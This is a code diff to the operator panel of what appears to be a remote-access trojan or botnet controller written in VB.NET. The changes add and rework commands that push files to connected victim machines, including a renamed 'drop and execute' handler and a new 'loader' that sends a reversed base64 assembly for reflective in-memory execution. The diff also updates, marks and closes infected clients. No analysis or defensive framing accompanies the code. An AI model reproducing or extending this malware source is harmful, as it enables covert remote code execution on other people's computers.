@@ -68,7 +68,8 @@ Public Class Form1
                 Dim B As Byte() = SB("CLOSE")
 
                 For Each C As ListViewItem In LV1.SelectedItems
-                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                    Dim CL As Client = CType(C.Tag, Client)
+                    Dim ClientReq As New Outcoming_Requests(CL, B)
                     Pending.Req_Out.Add(ClientReq)
                 Next
             Catch ex As Exception
@@ -91,8 +92,10 @@ Public Class Form1
                     Dim B As Byte() = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
-                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                        Dim CL As Client = CType(C.Tag, Client)
+                        Dim ClientReq As New Outcoming_Requests(CL, B)
                         Pending.Req_Out.Add(ClientReq)
+                        CL.L.ForeColor = Color.Red
                     Next
                 End If
             Catch ex As Exception
@@ -116,7 +119,7 @@ Public Class Form1
         End If
     End Sub
 
-    Private Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
+    Private Sub DROPANDEXECUTEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DROPANDEXECUTEToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
 
@@ -130,12 +133,35 @@ Public Class Form1
                     Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
-                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                        Dim CL As Client = CType(C.Tag, Client)
+                        Dim ClientReq As New Outcoming_Requests(CL, B)
                         Pending.Req_Out.Add(ClientReq)
+                        CL.L.ForeColor = Color.Red
                     Next
                 End If
             Catch ex As Exception
                 Debug.WriteLine("DownloadAndExecuteToolStripMenuItem " + ex.Message)
+            End Try
+        End If
+    End Sub
+
+    Private Sub LOADERToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LOADERToolStripMenuItem.Click
+        If LV1.SelectedItems.Count > 0 Then
+            Try
+                Dim LDR As New Loader
+                LDR.ShowDialog()
+                If LDR.isOK Then
+                    Dim B As Byte() = SB("REFLECTION" & Settings.SPL & StrReverse(Convert.ToBase64String(File.ReadAllBytes(LDR.o.FileName))))
+
+                    For Each C As ListViewItem In LV1.SelectedItems
+                        Dim CL As Client = CType(C.Tag, Client)
+                        Dim ClientReq As New Outcoming_Requests(CL, B)
+                        Pending.Req_Out.Add(ClientReq)
+                        CL.L.ForeColor = Color.Red
+                    Next
+                End If
+            Catch ex As Exception
+                Debug.WriteLine("LOADERToolStripMenuItem_Click " + ex.Message)
             End Try
         End If
     End Sub
@@ -236,7 +262,7 @@ Public Class Form1
                 LV.Tag = TaskID
                 LV3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
-                Dim NewDoTask As New TaskWorker With {
+                Dim NewDoTask As New TaskList With {
                     .Task = TaskID,
                     .B = B,
                     .F = Me
